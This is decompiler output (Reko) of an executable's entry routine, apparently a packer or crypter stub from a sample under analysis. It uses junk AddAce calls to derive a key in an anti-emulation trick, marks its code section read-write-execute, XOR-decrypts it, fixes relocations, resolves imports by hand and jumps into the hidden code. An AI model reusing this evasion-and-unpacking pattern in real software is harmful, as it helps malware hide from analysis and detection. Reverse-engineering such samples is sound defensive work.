// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 esi_1057 = AddAce(null, 0x00, 0x00, null, 0x00) + 0x26 + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00);
	Eq_3 ebp_1090 = null;
	if (AreAnyAccessesGranted(~0x00, ~0x00) == 0x00)
		esi_1057 = esi_1057 - 0x22;
	VirtualProtect(&globals->v401000, 0x3000, 0x40, fp - 0x10);
	struct Eq_675 * eax_1082 = null;
	do
	{
		if (ebp_1090 == esi_1057)
			ebp_1090 = null;
		eax_1082[0x00401490] = (struct Eq_675) (eax_1082[0x00401490] ^ ebp_1090[0x00404000]);
		eax_1082 = eax_1082 + 0x01;
		ebp_1090 = (Eq_3) (ebp_1090 + 0x01);
	} while (eax_1082 < (struct Eq_675 *) 5152);
	struct Eq_697 * ecx_1105 = &globals->t402770;
	uint32 dwLoc08_1115 = 0x00;
	do
	{
		Eq_701 eax_1125 = ecx_1105->t0004;
		word16 * edx_1130 = (char *) &ecx_1105->t0004 + 0x04;
		if (eax_1125 - 0x08 >> 0x01 > 0x00)
		{
			uint32 esi_1327 = eax_1125 - 0x08 >> 0x01;
			do
			{
				ui32 eax_1330 = (word32) *edx_1130;
				if ((eax_1330 & 0xF000) == 0x3000)
				{
					struct Eq_733 * eax_1341 = (eax_1330 & 0x0FFF) + ecx_1105->dw0000;
					eax_1341->dw401210 = eax_1341->dw401210 + 0xF0401210;
				}
				edx_1130 = edx_1130 + 0x01;
				esi_1327 = esi_1327 - 0x01;
			} while (esi_1327 != 0x00);
		}
		Eq_701 eax_1134 = ecx_1105->t0004;
		uint32 edx_1136 = (word32) eax_1134.u0 + dwLoc08_1115;
		word32 ecx_1137 = ecx_1105 + eax_1134;
		int32 eax_1141 = ecx_1137->dw0004;
		uint32 edx_1143 = edx_1136 + eax_1141;
		ecx_1105 = (struct Eq_697 *) (ecx_1137 + eax_1141 / 0x08);
		dwLoc08_1115 = edx_1143;
	} while (edx_1143 < 228);
	struct Eq_761 * edi_1155 = &globals->t401F6C;
	struct Eq_761 * dwLoc08_1156 = &globals->t401F6C;
	edi_1190 = edi_1155;
	if (globals->dw401F7C != 0x00)
	{
		do
		{
			struct Eq_761 * edi_1190;
			Eq_808 eax_1209 = LoadLibraryA(edi_1190->dw000C + 0x00401210);
			if (eax_1209 != null)
			{
				word32 ecx_1238 = edi_1190->dw0000;
				if (ecx_1238 == 0x00)
					ecx_1238 = edi_1190->dw0010;
				word32 * ebx_1248 = edi_1190->dw0010 + 0x00401210;
				word32 * ebp_1249 = ecx_1238 + 0x00401210;
				if (*ebp_1249 != 0x00)
				{
					do
					{
						Eq_864 eax_1293;
						int32 ecx_1281 = *ebp_1249;
						word16 cx_1283 = (word16) ecx_1281;
						if (ecx_1281 < 0x00)
							eax_1293 = GetProcAddress(eax_1209, (word32) cx_1283);
						else
							eax_1293 = GetProcAddress(eax_1209, ecx_1281 + 0x00401212);
						*ebx_1248 = (word32) eax_1293;
						ebp_1249 = ebp_1249 + 0x01;
						ebx_1248 = ebx_1248 + 0x01;
					} while (*ebp_1249 != 0x00);
					edi_1190 = dwLoc08_1156;
				}
			}
			edi_1190 = edi_1190 + 0x01;
			dwLoc08_1156 = edi_1190;
		} while (edi_1190->dw0010 != 0x00);
	}
	ptr32 esp_1167;
	byte SCZO_1168;
	word32 ebx_1169;
	word32 ebp_1170;
	word32 esi_1171;
	word32 edi_1172;
	byte SZO_1173;
	byte C_1174;
	word32 eax_1175;
	byte Z_1176;
	byte cl_1177;
	word32 ecx_1178;
	word32 edx_1179;
	byte S_1180;
	word16 cx_1181;
	globals->t401C60();
	*(esp_1167 - 0x04) = 0x00;
	ExitProcess(*(esp_1167 - 0x04));
}

